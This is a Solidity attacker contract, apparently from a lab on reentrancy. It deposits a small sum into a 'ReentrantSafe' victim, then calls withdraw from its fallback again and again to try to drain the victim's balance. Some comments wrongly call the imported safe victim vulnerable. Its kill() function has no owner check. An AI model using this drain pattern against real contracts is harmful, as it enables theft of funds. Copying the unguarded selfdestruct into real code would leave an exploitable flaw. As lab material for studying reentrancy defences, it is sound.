pragma solidity ^0.4.18;
import "./ReentrantSafe.sol";

/// This contract would be owned by the attacker
contract ReentrantAttackerFailed {
    ReentrantSafe public victim; // the contract instance I want to attack

    /// Constructor
    function ReentrantAttackerFailed(address _address) public {
        // _address is the address of the deployed ReentrantSafe instance
        // See 4_initial_migration.js
        // deployer.deploy(ReentrantAttacker, ReentrantSafe.address) 
        victim = ReentrantSafe(_address);
    }

    /// Destroy this contract instance
    function kill() public {
        selfdestruct(msg.sender); // Caller will get back all the balance from this contract instance
                                  // See Ownable.sol for a proper implementattion of kill()
    }

    /// Caller just provide a small amount to this function
    /// the victim's balance will drained recursively
    function attack() public payable {
        victim.deposit.value(msg.value)(); // sender/attacker can deposit a small amount
        victim.withdraw(); // victim's withdraw function is not re-entrant safe
                           // below fallback will be invoked
    }

    function () public payable {
        // this fallback will be recursively called by calling victim's withdraw
        // to prevent infinite recursive stackoverflow or out of gas
        // the stop condition is when victim's balance is less than attacking amount.
        if (victim.balance >= msg.value) {
            victim.withdraw();
        }
    }
}